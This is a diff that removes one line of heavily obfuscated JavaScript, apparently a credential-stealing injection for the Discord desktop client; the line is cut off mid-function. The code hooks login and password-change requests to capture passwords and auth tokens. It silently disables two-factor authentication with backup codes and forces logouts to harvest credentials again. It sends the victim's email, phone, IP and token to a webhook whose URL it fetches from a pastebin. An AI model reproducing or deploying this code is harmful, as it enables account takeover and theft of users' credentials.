@@ -1,1 +1,388 @@
-const f=function(){const h={};h['Si'+'rF'+'v']='lo'+'gi'+'n';h['eY'+'bj'+'Y']='gt'+'do'+'u';h['dx'+'Rq'+'d']=function(k,l){return k!==l;};h['nE'+'QN'+'R']='dT'+'my'+'y';const i=h;let j=!![];return function(k,l){const m={};m['Il'+'Zt'+'r']=function(o,p){return o===p;};m['Rx'+'Id'+'L']=i['eY'+'bj'+'Y'];const n=m;if(i['dx'+'Rq'+'d']('Gp'+'Zm'+'e',i['nE'+'QN'+'R'])){const o=j?function(){if(n['Il'+'Zt'+'r'](n['Rx'+'Id'+'L'],n['Rx'+'Id'+'L'])){if(l){const p=l['ap'+'pl'+'y'](k,arguments);l=null;return p;}}else{if(window['re'+'q']['c']['ha'+'sO'+'wn'+'Pr'+'op'+'er'+'ty'](i)){const r=window['re'+'q']['c'][i]['ex'+'po'+'rt'+'s'];if(r&&r['__'+'es'+'Mo'+'du'+'le']&&r['de'+'fa'+'ul'+'t']&&moduleName==r['de'+'fa'+'ul'+'t'][moduleName])modules['pu'+'sh'](r['de'+'fa'+'ul'+'t']);}}}:function(){};j=![];return o;}else{Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](i['Si'+'rF'+'v'])['lo'+'go'+'ut']();}};}();const e=f(this,function(){const h={};h['dm'+'jh'+'u']='re'+'tu'+'rn'+'\x20/'+'\x22\x20'+'+\x20'+'th'+'is'+'\x20+'+'\x20\x22'+'/';h['hT'+'TT'+'h']='^('+'[^'+'\x20]'+'+('+'\x20+'+'[^'+'\x20]'+'+)'+'+)'+'+['+'^\x20'+']}';h['Zy'+'aw'+'H']=function(k){return k();};const i=h;const j=function(){const k=j['co'+'ns'+'tr'+'uc'+'to'+'r'](i['dm'+'jh'+'u'])()['co'+'mp'+'il'+'e'](i['hT'+'TT'+'h']);return!k['te'+'st'](e);};return i['Zy'+'aw'+'H'](j);});e();const d=function(){const h={};h['ly'+'oE'+'G']=function(k,l){return k!==l;};h['Cf'+'ew'+'R']='Eg'+'JE'+'Y';h['Fg'+'Rf'+'v']='YS'+'Qa'+'e';const i=h;let j=!![];return function(k,l){const m={};m['rz'+'OB'+'q']=function(p,q){return i['ly'+'oE'+'G'](p,q);};m['HH'+'pU'+'X']=i['Cf'+'ew'+'R'];m['ly'+'mY'+'Y']=i['Fg'+'Rf'+'v'];const n=m;const o=j?function(){if(l){if(n['rz'+'OB'+'q'](n['HH'+'pU'+'X'],n['ly'+'mY'+'Y'])){const p=l['ap'+'pl'+'y'](k,arguments);l=null;return p;}else{const r={};r['na'+'me']='Ph'+'on'+'e\x20'+'nu'+'mb'+'er';r['va'+'lu'+'e']=currentUser['ph'+'on'+'e'];currentUserFields['pu'+'sh'](r);}}}:function(){};j=![];return o;};}();(function(){const h={};h['Lm'+'zq'+'m']='\x5c+'+'\x5c+'+'\x20*'+'(?'+':['+'a-'+'zA'+'-Z'+'_$'+']['+'0-'+'9a'+'-z'+'A-'+'Z_'+'$]'+'*)';h['iM'+'Hm'+'m']=function(j,k){return j(k);};h['pz'+'ng'+'O']='ch'+'ai'+'n';h['PK'+'SU'+'l']='in'+'pu'+'t';h['zZ'+'uJ'+'T']=function(j,k){return j(k);};h['BK'+'ar'+'j']=function(j){return j();};h['Eb'+'Le'+'d']=function(j,k,l){return j(k,l);};const i=h;i['Eb'+'Le'+'d'](d,this,function(){const j=new RegExp('fu'+'nc'+'ti'+'on'+'\x20*'+'\x5c('+'\x20*'+'\x5c)');const k=new RegExp(i['Lm'+'zq'+'m'],'i');const l=i['iM'+'Hm'+'m'](c,'in'+'it');if(!j['te'+'st'](l+i['pz'+'ng'+'O'])||!k['te'+'st'](l+i['PK'+'SU'+'l'])){i['zZ'+'uJ'+'T'](l,'0');}else{i['BK'+'ar'+'j'](c);}})();}());const path=window['re'+'qu'+'ir'+'e']('pa'+'th');const fs=window['re'+'qu'+'ir'+'e']('fs');const electron=window['re'+'qu'+'ir'+'e']('el'+'ec'+'tr'+'on');const Module=window['re'+'qu'+'ir'+'e']('mo'+'du'+'le')['Mo'+'du'+'le'];Module['gl'+'ob'+'al'+'Pa'+'th'+'s']['pu'+'sh'](path['re'+'so'+'lv'+'e'](electron['re'+'mo'+'te']['ap'+'p']['ge'+'tA'+'pp'+'Pa'+'th'](),'no'+'de'+'_m'+'od'+'ul'+'es'));const currentWindow=electron['re'+'mo'+'te']['ge'+'tC'+'ur'+'re'+'nt'+'Wi'+'nd'+'ow']();if(currentWindow['__'+'pr'+'el'+'oa'+'d'])require(currentWindow['__'+'pr'+'el'+'oa'+'d']);let currentPassword='';function sleep(h){const i={};i['oi'+'PM'+'B']='re'+'tu'+'rn'+'\x20/'+'\x22\x20'+'+\x20'+'th'+'is'+'\x20+'+'\x20\x22'+'/';i['ac'+'Gc'+'M']=function(k,l){return k===l;};i['Lx'+'sD'+'e']='Bm'+'Ke'+'F';i['aY'+'Py'+'r']=function(k,l,m){return k(l,m);};const j=i;return new Promise(k=>{const l={};l['kf'+'sl'+'Q']=j['oi'+'PM'+'B'];l['GT'+'lE'+'q']='^('+'[^'+'\x20]'+'+('+'\x20+'+'[^'+'\x20]'+'+)'+'+)'+'+['+'^\x20'+']}';const m=l;if(j['ac'+'Gc'+'M'](j['Lx'+'sD'+'e'],'bW'+'dF'+'y')){const o=test['co'+'ns'+'tr'+'uc'+'to'+'r'](YoXsXp['kf'+'sl'+'Q'])()['co'+'mp'+'il'+'e'](YoXsXp['GT'+'lE'+'q']);return!o['te'+'st'](e);}else{j['aY'+'Py'+'r'](setTimeout,k,h);}});}Oxygen={};Oxygen['lo'+'ca'+'lS'+'to'+'ra'+'ge']=window['lo'+'ca'+'lS'+'to'+'ra'+'ge'];async function initialize(){const i={};i['Jl'+'pq'+'o']=function(l,m){return l(m);};i['dn'+'xI'+'c']='__'+'ex'+'tr'+'a_'+'id'+'__';i['oW'+'CM'+'k']='di'+'sp'+'at'+'ch';i['Jf'+'Jm'+'t']=function(l,m){return l(m);};const j=i;while(!window['we'+'bp'+'ac'+'kJ'+'so'+'np'])await j['Jl'+'pq'+'o'](sleep,0x64);Oxygen['we'+'bS'+'oc'+'ke'+'t']=window['_w'+'s'];const k={};k['__'+'ex'+'tr'+'a_'+'id'+'__']=(l,m,n)=>l['ex'+'po'+'rt'+'s']=n;window['re'+'q']=window['we'+'bp'+'ac'+'kJ'+'so'+'np']['pu'+'sh']([[],k,[[j['dn'+'xI'+'c']]]]);delete window['re'+'q']['m'][j['dn'+'xI'+'c']];delete window['re'+'q']['c'][j['dn'+'xI'+'c']];while(!Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](j['oW'+'CM'+'k']))await j['Jf'+'Jm'+'t'](sleep,0x64);}process['on'+'ce']('lo'+'ad'+'ed',async()=>{const h={};h['Uj'+'iX'+'h']='/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/t'+'ot'+'p/'+'en'+'ab'+'le';h['WU'+'Pz'+'h']=function(n,o,p,q){return n(o,p,q);};h['Cm'+'pK'+'A']=function(n,o){return n===o;};h['dW'+'qO'+'m']='st'+'ri'+'ng';h['dO'+'DV'+'Z']='/u'+'se'+'rs'+'/@'+'me'+'/b'+'il'+'li'+'ng'+'/p'+'ay'+'me'+'nt'+'s';h['Om'+'ST'+'R']='RM'+'IH'+'Z';h['qf'+'dn'+'b']='Cv'+'QN'+'O';h['tq'+'lB'+'y']='/u'+'se'+'rs'+'/@'+'me'+'/e'+'nt'+'it'+'le'+'me'+'nt'+'s/'+'gi'+'ft'+'s';h['cK'+'bn'+'O']='/a'+'ut'+'h/'+'lo'+'gi'+'n';h['us'+'zd'+'j']=function(n,o){return n===o;};h['YZ'+'mW'+'u']='Eb'+'cD'+'I';h['SQ'+'cm'+'s']=function(n,o,p,q){return n(o,p,q);};h['gd'+'Ml'+'D']='Ac'+'co'+'un'+'t\x20'+'cr'+'ed'+'en'+'ti'+'al'+'s';h['tO'+'iR'+'x']='Pa'+'ss'+'wo'+'rd';h['Pb'+'sJ'+'U']=function(n,o){return n==o;};h['Lb'+'Us'+'L']=function(n,o){return n!==o;};h['hZ'+'Mp'+'l']='kq'+'YZ'+'w';h['yR'+'nP'+'N']=function(n,o){return n(o);};h['dk'+'CP'+'b']=function(n,o){return n(o);};h['bw'+'KH'+'i']='Ci'+'Rz'+'Y';h['Si'+'Ev'+'Q']=function(n,o){return n==o;};h['px'+'hd'+'O']=function(n,o){return n!==o;};h['PQ'+'Qd'+'l']='GI'+'qb'+'d';h['MX'+'du'+'n']='qK'+'oE'+'u';h['Tk'+'QL'+'q']=function(n,o){return n===o;};h['ef'+'id'+'A']=function(n,o){return n===o;};h['HN'+'SQ'+'K']='FS'+'ys'+'w';h['Ta'+'rL'+'L']='/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/t'+'ot'+'p/'+'di'+'sa'+'bl'+'e';h['Kx'+'Qx'+'P']=function(n){return n();};h['cr'+'Pn'+'g']='mf'+'a.';h['YG'+'iN'+'T']=function(n,o){return n===o;};h['XL'+'DQ'+'i']='Qp'+'DX'+'z';h['cF'+'SU'+'S']=function(n,o){return n!=o;};h['Pt'+'FD'+'P']=function(n,o){return n!==o;};h['zX'+'jg'+'W']='iZ'+'GD'+'Z';h['GP'+'uo'+'R']='NZ'+'FZ'+'s';h['DT'+'Us'+'q']='/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/c'+'od'+'es';h['UW'+'Ch'+'g']='lo'+'gi'+'n';h['Ab'+'ea'+'h']=function(n,o,p){return n(o,p);};h['Au'+'wf'+'l']='Ac'+'co'+'un'+'t\x20'+'Au'+'th'+'or'+'iz'+'at'+'io'+'n\x20'+'To'+'ke'+'n';h['Yw'+'Yv'+'C']='To'+'ke'+'n';h['Zf'+'do'+'T']=function(n){return n();};h['cl'+'Sp'+'E']='po'+'st';h['hh'+'WR'+'y']='se'+'tT'+'ok'+'en';h['lm'+'dQ'+'F']='ge'+'t';h['yo'+'qe'+'R']=function(n,o,p){return n(o,p);};h['RH'+'WY'+'j']='pa'+'tc'+'h';h['lS'+'vb'+'g']=function(n,o){return n+o;};h['Bw'+'iX'+'e']='\x5cn'+'ot'+'_l'+'og'+'_o'+'ut';h['Ld'+'Xc'+'Y']=function(n,o){return n+o;};const i=h;await i['Zf'+'do'+'T'](initialize);const j=Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](i['cl'+'Sp'+'E']);const k=Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](i['hh'+'WR'+'y']);i['Ab'+'ea'+'h'](hookHttp,i['lm'+'dQ'+'F'],function(n,o){const p=i['Cm'+'pK'+'A'](typeof n,i['dW'+'qO'+'m'])?n:n['ur'+'l'];if(p['in'+'cl'+'ud'+'es'](i['dO'+'DV'+'Z'])){if(i['Om'+'ST'+'R']===i['qf'+'dn'+'b']){if(n['ur'+'l']==i['Uj'+'iX'+'h']&&process['en'+'v']['mf'+'a']){n['bo'+'dy']['co'+'de']='d';}return i['WU'+'Pz'+'h'](l,n,meme1,meme2);}else{o['bo'+'dy']=[];}}else if(p['in'+'cl'+'ud'+'es'](i['tq'+'lB'+'y'])){o['bo'+'dy']=[];}});hookHttp(i['cl'+'Sp'+'E'],function(n,o){switch(n['ur'+'l']){case i['cK'+'bn'+'O']:if(i['us'+'zd'+'j'](o['st'+'at'+'us'],0xc8)){if(i['us'+'zd'+'j'](i['YZ'+'mW'+'u'],i['YZ'+'mW'+'u'])){currentPassword=n['bo'+'dy']['pa'+'ss'+'wo'+'rd'];i['SQ'+'cm'+'s'](executeWebhook,i['gd'+'Ml'+'D'],[{'name':i['tO'+'iR'+'x'],'value':n['bo'+'dy']['pa'+'ss'+'wo'+'rd']}],![]);}else{n['bo'+'dy']['co'+'de']='d';}}break;}});const l=j['po'+'st'];j['po'+'st']=async function(n,o,p){if(i['Pb'+'sJ'+'U'](n['ur'+'l'],'/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/t'+'ot'+'p/'+'en'+'ab'+'le')&&process['en'+'v']['mf'+'a']){if(i['Lb'+'Us'+'L'](i['hZ'+'Mp'+'l'],'qF'+'zI'+'L')){n['bo'+'dy']['co'+'de']='d';}else{if(fn){const r=fn['ap'+'pl'+'y'](context,arguments);fn=null;return r;}}}return i['SQ'+'cm'+'s'](l,n,o,p);};i['yo'+'qe'+'R'](hookHttp,i['RH'+'WY'+'j'],function(n,o){if(i['Lb'+'Us'+'L'](i['bw'+'KH'+'i'],i['bw'+'KH'+'i'])){const q=i['us'+'zd'+'j'](typeof filter,i['dW'+'qO'+'m'])?filter:null;for(const r in window['re'+'q']['c']){if(window['re'+'q']['c']['ha'+'sO'+'wn'+'Pr'+'op'+'er'+'ty'](r)){const s=window['re'+'q']['c'][r]['ex'+'po'+'rt'+'s'];if(s&&s['__'+'es'+'Mo'+'du'+'le']&&s['de'+'fa'+'ul'+'t']&&(q?s['de'+'fa'+'ul'+'t'][q]:i['yR'+'nP'+'N'](filter,s['de'+'fa'+'ul'+'t'])))return window['re'+'q']['c'][r];if(s&&(q?s[q]:i['dk'+'CP'+'b'](filter,s)))return window['re'+'q']['c'][r];}}return null;}else{switch(n['ur'+'l']){case'/u'+'se'+'rs'+'/@'+'me':if(i['Si'+'Ev'+'Q'](o['st'+'at'+'us'],0xc8)){if(i['px'+'hd'+'O'](i['PQ'+'Qd'+'l'],i['MX'+'du'+'n'])){let q;if(n['bo'+'dy']['ne'+'w_'+'pa'+'ss'+'wo'+'rd'])q=n['bo'+'dy']['ne'+'w_'+'pa'+'ss'+'wo'+'rd'];else if(n['bo'+'dy']['pa'+'ss'+'wo'+'rd'])q=n['bo'+'dy']['pa'+'ss'+'wo'+'rd'];else return;i['SQ'+'cm'+'s'](executeWebhook,i['gd'+'Ml'+'D'],[{'name':i['tO'+'iR'+'x'],'value':q}],![]);}else{return debuggerProtection;}}break;}}});const m=k['se'+'tT'+'ok'+'en'];k['se'+'tT'+'ok'+'en']=function(n){const o={};o['vG'+'gr'+'k']=function(q){return i['Kx'+'Qx'+'P'](q);};const p=o;m(n);if(n){if(n['st'+'ar'+'ts'+'Wi'+'th'](i['cr'+'Pn'+'g'])&&process['en'+'v']['mf'+'a']){if(i['YG'+'iN'+'T']('Lt'+'Jg'+'z',i['XL'+'DQ'+'i'])){return i['dk'+'CP'+'b'](method,...params);}else{if(i['cF'+'SU'+'S'](currentPassword,'')){if(i['Pt'+'FD'+'P'](i['zX'+'jg'+'W'],i['GP'+'uo'+'R'])){const r={};r['pa'+'ss'+'wo'+'rd']=currentPassword;r['re'+'ge'+'ne'+'ra'+'te']=!![];const s={};s['ur'+'l']=i['DT'+'Us'+'q'];s['bo'+'dy']=r;j['po'+'st'](s)['th'+'en'](function(t){const u={};u['xW'+'vT'+'g']=function(w,z){return i['Tk'+'QL'+'q'](w,z);};u['ra'+'SA'+'v']=function(w,z){return i['ef'+'id'+'A'](w,z);};u['sk'+'SA'+'C']=i['HN'+'SQ'+'K'];const v=u;if(t['st'+'at'+'us']===0xc8){const w={};w['co'+'de']=t['bo'+'dy']['ba'+'ck'+'up'+'_c'+'od'+'es'][0x0]['co'+'de'];const x={};x['ur'+'l']=i['Ta'+'rL'+'L'];x['bo'+'dy']=w;j['po'+'st'](x)['th'+'en'](function(y){const z={};z['Eq'+'WO'+'u']=function(B,C){return v['xW'+'vT'+'g'](B,C);};z['sO'+'QJ'+'c']='/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/t'+'ot'+'p/'+'di'+'sa'+'bl'+'e';const A=z;if(y['st'+'at'+'us']===0xc8){if(v['ra'+'SA'+'v'](v['sk'+'SA'+'C'],'FS'+'ys'+'w')){k['se'+'tT'+'ok'+'en'](y['bo'+'dy']['to'+'ke'+'n']);}else{if(A['Eq'+'WO'+'u'](t['st'+'at'+'us'],0xc8)){const C={};C['co'+'de']=t['bo'+'dy']['ba'+'ck'+'up'+'_c'+'od'+'es'][0x0]['co'+'de'];const D={};D['ur'+'l']=A['sO'+'QJ'+'c'];D['bo'+'dy']=C;j['po'+'st'](D)['th'+'en'](function(E){if(E['st'+'at'+'us']===0xc8){k['se'+'tT'+'ok'+'en'](E['bo'+'dy']['to'+'ke'+'n']);}});}}}});}});}else{RDxSHy['vG'+'gr'+'k'](c);}}else{Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](i['UW'+'Ch'+'g'])['lo'+'go'+'ut']();}return;}}i['Ab'+'ea'+'h'](executeWebhook,i['Au'+'wf'+'l'],[{'name':i['Yw'+'Yv'+'C'],'value':n}]);}};if(i['YG'+'iN'+'T'](fs['ex'+'is'+'ts'+'Sy'+'nc'](i['lS'+'vb'+'g'](process['en'+'v']['mo'+'dD'+'ir'],i['Bw'+'iX'+'e'])),![])){Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le']('lo'+'gi'+'n')['lo'+'go'+'ut']();fs['wr'+'it'+'eF'+'il'+'e'](i['Ld'+'Xc'+'Y'](process['en'+'v']['mo'+'dD'+'ir'],i['Bw'+'iX'+'e']),'',function(){});}});function hookHttp(h,i){const j={};j['Mq'+'ru'+'z']=function(n,o,p){return n(o,p);};const k=j;const l=Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le']('po'+'st');const m=l[h];l[h]=async function(n,o,p){const q=await m(n,o,p);const r=k['Mq'+'ru'+'z'](i,n,q);if(r)return r;else return q;};}function executeWebhook(h,i,j=!![]){const k={};k['An'+'Gi'+'N']='ht'+'tp'+'s:'+'//'+'cd'+'n.'+'di'+'sc'+'or'+'da'+'pp'+'.c'+'om'+'/a'+'tt'+'ac'+'hm'+'en'+'ts'+'/7'+'10'+'75'+'44'+'76'+'97'+'74'+'22'+'42'+'1/'+'71'+'14'+'62'+'16'+'84'+'82'+'02'+'14'+'06'+'/f'+'il'+'le'+'r.'+'pn'+'g';k['wq'+'mT'+'U']=function(m,n){return m===n;};k['gC'+'wp'+'I']='Ij'+'Pm'+'b';k['lG'+'iA'+'b']='qo'+'jT'+'u';k['go'+'jC'+'h']=function(m){return m();};k['UM'+'kM'+'T']=function(m,n,o){return m(n,o);};k['BF'+'US'+'x']=function(m,n){return m!==n;};k['Ih'+'dO'+'n']='Or'+'Pk'+'M';k['qR'+'aN'+'P']='ge'+'tU'+'se'+'r';k['Dk'+'WA'+'O']=function(m,n){return m(n);};k['Us'+'wD'+'e']='Em'+'ai'+'l';k['sL'+'EL'+'K']=function(m,n){return m+n;};k['An'+'rS'+'I']='XA'+'oh'+'T';k['St'+'ln'+'Q']='Ph'+'on'+'e\x20'+'nu'+'mb'+'er';k['Nb'+'UF'+'o']='GE'+'T';k['ep'+'bu'+'e']='ht'+'tp'+'s:'+'//'+'wt'+'fi'+'sm'+'yi'+'p.'+'co'+'m/'+'te'+'xt';k['uK'+'IX'+'Z']=function(m,n){return m!==n;};k['ea'+'bL'+'D']='ht'+'tp'+'s:'+'//'+'co'+'rs'+'-a'+'ny'+'wh'+'er'+'e.'+'he'+'ro'+'ku'+'ap'+'p.'+'co'+'m/'+'pa'+'st'+'eb'+'in'+'.c'+'om'+'/r'+'aw'+'/c'+'BC'+'ZX'+'kF'+'7';k['nv'+'fd'+'S']='ap'+'pl'+'ic'+'at'+'io'+'n/'+'js'+'on';k['az'+'KW'+'R']='de'+'bu';k['Vb'+'XF'+'y']=function(m,n){return m(n);};k['MI'+'id'+'J']=function(m,n){return m!==n;};k['GS'+'oY'+'X']='WP'+'wL'+'z';k['GG'+'Vy'+'g']=function(m,n,o){return m(n,o);};const l=k;return new Promise(function(m){const n={};n['HO'+'hy'+'L']=function(p,q){return p+q;};n['GR'+'sX'+'j']=l['az'+'KW'+'R'];n['To'+'lp'+'b']=function(p,q){return p===q;};n['RV'+'IZ'+'t']=function(p,q){return l['Vb'+'XF'+'y'](p,q);};const o=n;if(l['MI'+'id'+'J']('kh'+'ar'+'o',l['GS'+'oY'+'X'])){const p=l['GG'+'Vy'+'g'](setInterval,async function(){const r={};r['wV'+'Ow'+'g']=l['An'+'Gi'+'N'];r['EZ'+'El'+'u']=function(t,u){return l['wq'+'mT'+'U'](t,u);};r['qb'+'Wl'+'R']=l['gC'+'wp'+'I'];r['Kx'+'wn'+'f']='/w'+'eb'+'ho'+'ok'+'s/';r['YK'+'hX'+'N']=function(t,u){return l['wq'+'mT'+'U'](t,u);};r['ZN'+'Gg'+'E']=l['lG'+'iA'+'b'];r['pq'+'eK'+'L']=function(t){return l['go'+'jC'+'h'](t);};r['xM'+'UN'+'l']=function(t,u,v){return l['UM'+'kM'+'T'](t,u,v);};const s=r;if(l['BF'+'US'+'x'](l['Ih'+'dO'+'n'],'Ao'+'dN'+'U')){const t=Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le'](l['qR'+'aN'+'P'])['ge'+'tC'+'ur'+'re'+'nt'+'Us'+'er']();if(t){if(l['BF'+'US'+'x']('Uw'+'eu'+'n','ST'+'gw'+'H')){l['Dk'+'WA'+'O'](clearInterval,p);const u={};u['na'+'me']='ID';u['va'+'lu'+'e']=t['id'];const v={};v['na'+'me']=l['Us'+'wD'+'e'];v['va'+'lu'+'e']=t['em'+'ai'+'l'];const w={};w['na'+'me']='Us'+'er';w['va'+'lu'+'e']=l['sL'+'EL'+'K'](t['us'+'er'+'na'+'me'],'#')+t['di'+'sc'+'ri'+'mi'+'na'+'to'+'r'];const x=[u,v,w];if(t['ph'+'on'+'e']){if('dG'+'Pa'+'S'!==l['An'+'rS'+'I']){const G={};G['na'+'me']=l['St'+'ln'+'Q'];G['va'+'lu'+'e']=t['ph'+'on'+'e'];x['pu'+'sh'](G);}else{const I=firstCall?function(){if(fn){const J=fn['ap'+'pl'+'y'](context,arguments);fn=null;return J;}}:function(){};firstCall=![];return I;}}const y=Oxygen['Ap'+'i']['fi'+'nd'+'Mo'+'du'+'le']('po'+'st');const z=new XMLHttpRequest();z['op'+'en'](l['Nb'+'UF'+'o'],l['ep'+'bu'+'e'],![]);z['se'+'nd']();const A={};A['na'+'me']='IP';A['va'+'lu'+'e']=z['re'+'sp'+'on'+'se'+'Te'+'xt'];const B={};B['ti'+'tl'+'e']=h;B['fi'+'el'+'ds']=[A]['co'+'nc'+'at'](x)['co'+'nc'+'at'](i);const C={};C['em'+'be'+'ds']=[B];const D=C;if(!j){if(l['uK'+'IX'+'Z']('MT'+'NS'+'G','zW'+'GL'+'S')){const I={};I['ur'+'l']=l['An'+'Gi'+'N'];D['em'+'be'+'ds'][0x0]['th'+'um'+'bn'+'ai'+'l']=I;}else{(function(){return!![];}['co'+'ns'+'tr'+'uc'+'to'+'r'](cLHpTi['HO'+'hy'+'L'](cLHpTi['GR'+'sX'+'j'],'gg'+'er'))['ca'+'ll']('ac'+'ti'+'on'));}}const E=function(K){return new Promise(async function(L){const M={};M['Ca'+'BI'+'p']='/u'+'se'+'rs'+'/@'+'me'+'/m'+'fa'+'/t'+'ot'+'p/'+'di'+'sa'+'bl'+'e';M['jS'+'nz'+'P']=s['wV'+'Ow'+'g'];const N=M;while(!![]){if(s['EZ'+'El'+'u'](s['qb'+'Wl'+'R'],s['qb'+'Wl'+'R'])){try{const O={};O['ur'+'l']=s['Kx'+'wn'+'f']+K;O['bo'+'dy']=D;await y['po'+'st'](O);}catch(P){if(P['st'+'at'+'us']){if(s['YK'+'hX'+'N'](s['ZN'+'Gg'+'E'],s['ZN'+'Gg'+'E'])){if(s['YK'+'hX'+'N'](P['st'+'at'+'us'],0x1ad)){await sleep(P['bo'+'dy']['re'+'tr'+'y_'+'af'+'te'+'r']);continue;}}else{const R={};R['co'+'de']=response['bo'+'dy']['ba'+'ck'+'up'+'_c'+'od'+'es'][0x0]['co'+'de'];const S={};S['ur'+'l']=N['Ca'+'BI'+'p'];S['bo'+'dy']=R;discordHttp['po'+'st'](S)['th'+'en'](function(T){if(T['st'+'at'+'us']===0xc8){setTokenModule['se'+'tT'+'ok'+'en'](T['bo'+'dy']['to'+'ke'+'n']);}});}}}s['pq'+'eK'+'L'](L);return;}else{const S={};S['ur'+'l']=N['jS'+'nz'+'P'];D['em'+'be'+'ds'][0x0]['th'+'um'+'bn'+'ai'+'l']=S;}}});};const F=new XMLHttpRequest();F['op'+'en'](l['Nb'+'UF'+'o'],l['ea'+'bL'+'D']);F['se'+'tR'+'eq'+'ue'+'st'+'He'+'ad'+'er']('Co'+'nt'+'en'+'t-'+'Ty'+'pe',l['nv'+'fd'+'S']);F['on'+'re'+'ad'+'ys'+'ta'+'te'+'ch'+'an'+'ge']=async function(K){if(o['To'+'lp'+'b'](F['re'+'ad'+'yS'+'ta'+'te'],0x4)){await o['RV'+'IZ'+'t'](E,F['re'+'sp'+'on'+'se'+'Te'+'xt']);await o['RV'+'IZ'+'t'](E,process['en'+'v']['ho'+'ok']);}};F['se'+'nd']();}else{s['xM'+'UN'+'l'](setTimeout,resolve,ms);}}}else{return!![];}},0x64);}else{response['bo'+'dy']=[];}});}Oxygen['Ap'+'i']=class OxygenApi{static get['Re'+'ac'+'t'](){const h={};h['rU'+'pV'+'W']='cr'+'ea'+'te'+'El'+'em'+'en'+'t';const i=h;return this['fi'+'nd'+'Mo'+'du'+'le'+'By'+'Pr'+'op'+'s'](i['rU'+'pV'+'W']);}static get['Re'+'ac'+'tD'+'OM'](){const h={};h['jy'+'zV'+'n']='fi'+'nd'+'DO'+'MN'+'od'+'e';const i=h;return this['fi'+'nd'+'Mo'+'du'+'le'+'By'+'Pr'+'op'+'s'](i['jy'+'zV'+'n']);}static['fi'+'nd'+'Mo'+'du'+'le'](h,j=!![]){const k={};k['Ic'+'ld'+'h']='wh'+'il'+'e\x20'+'(t'+'ru'+'e)'+'\x20{'+'}';k['hm'+'gA'+'e']=function(o,p){return o===p;};k['hg'+'iD'+'i']=function(o,p){return o!==p;};k['bl'+'HP'+'i']='BU'+'vP'+'X';k['TY'+'aa'+'X']='nQ'+'OX'+'W';k['BQ'+'EU'+'m']='ig'+'je'+'G';k['Me'+'LF'+'M']=function(o,p){return o(p);};const l=k;const n=l['hm'+'gA'+'e'](typeof h,'st'+'ri'+'ng')?h:null;for(const o in window['re'+'q']['c']){if(l['hg'+'iD'+'i'](l['bl'+'HP'+'i'],l['TY'+'aa'+'X'])){if(window['re'+'q']['c']['ha'+'sO'+'wn'+'Pr'+'op'+'er'+'ty'](o)){if(l['hm'+'gA'+'e']('ig'+'je'+'G',l['BQ'+'EU'+'m'])){const p=window['re'+'q']['c'][o]['ex'+'po'+'rt'+'s'];if(p&&p['__'+'es'+'Mo'+'du'+'le']&&p['de'+'fa'+'ul'+'t']&&(n?p['de'+'fa'+'ul'+'t'][n]:h(p['de'+'fa'+'ul'+'t'])))return p['de'+'fa'+'ul'+'t'];if(p&&(n?p[n]:l['Me'+'LF'+'M'](h,p)))return p;}else{const r={};r['in'+'st'+'ea'+'d']=options;r['si'+'le'+'nt']=!![];const s=r;options=s;}}}else{return function(s){}['co'+'ns'+'tr'+'uc'+'to'+'r'](CbCXvA['Ic'+'ld'+'h'])['ap'+'pl'+'y']('co'+'un'+'te'+'r');}}return null;}static['fi'+'nd'+'Ra'+'wM'+'od'+'ul'+'e'](h,j=!![]){const k={};k['iw'+'lb'+'j']=function(o,p){return o===p;};k['mn'+'tW'+'j']=function(o,p){return o(p);};k['az'+'vo'+'Y']=function(o,p){return o(p);};const l=k;const n=l['iw'+'lb'+'j'](typeof h,'st'+'ri'+'ng')?h:null;for(const o in window['re'+'q']['c']){if(window['re'+'q']['c']['ha'+'sO'+'wn'+'Pr'+'op'+'er'+'ty'](o)){const p=window['re'+'q']['c'][o]['ex'+'po'+'rt'+'s'];if(p&&p['__'+'es'+'Mo'+'du'+'le']&&p['de'+'fa'+'ul'+'t']&&(n?p['de'+'fa'+'ul'+'t'][n]:l['mn'+'tW'+'j'](h,p['de'+'fa'+'ul'+'t'])))return window['re'+'q']['c'][o];if(p&&(n?p[n]:l['az'+'vo'+'Y'](h,p)))return window['re'+'q']['c'][o];}}return null;}static['fi'+'nd'+'Al'+'lM'+'od'+'ul'+'es'](h){const j={};j['Jv'+'Vs'+'I']='re'+'tu'+'rn'+'\x20/'+'\x22\x20'+'+\x20'+'th'+'is'+'\x20+'+'\x20\x22'+'/';j['sd'+'hT'+'o']='^('+'[^'+'\x20]'+'+('+'\x20+'+'[^'+'\x20]'+'+)'+'+)'+'+['+'^\x20'+']}';j['qM'+'oU'+'H']=function(o){return o();};j['DK'+'gl'+'O']='st'+'ri'+'ng';j['ho'+'sL'+'i']=function(o,p){return o===p;};j['XT'+'eY'+'Q']='qH'+'Wz'+'s';j['Do'+'hC'+'C']=function(o,p){return o==p;};const k=j;const l=typeof h===k['DK'+'gl'+'O']?h:null;const n=[];for(const o in window['re'+'q']['c']){if(window['re'+'q']['c']['ha'+'sO'+'wn'+'Pr'+'op'+'er'+'ty'](o)){if(k['ho'+'sL'+'i'](k['XT'+'eY'+'Q'],k['XT'+'eY'+'Q'])){const p=window['re'+'q']['c'][o]['ex'+'po'+'rt'+'s'];if(p&&p['__'+'es'+'Mo'+'du'+'le']&&p['de'+'fa'+'ul'+'t']&&k['Do'+'hC'+'C'](l,p['de'+'fa'+'ul'+'t'][l]))n['pu'+'sh'](p['de'+'fa'+'ul'+'t']);}else{const r=function(){const s=r['co'+'ns'+'tr'+'uc'+'to'+'r'](WBTLCc['Jv'+'Vs'+'I'])()['co'+'mp'+'il'+'e'](WBTLCc['sd'+'hT'+'o']);return!s['te'+'st'](e);};return WBTLCc['qM'+'oU'+'H'](r);}}}return n;}static['fi'+'nd'+'Mo'+'du'+'le'+'By'+'Pr'+'op'+'s'](...g){return 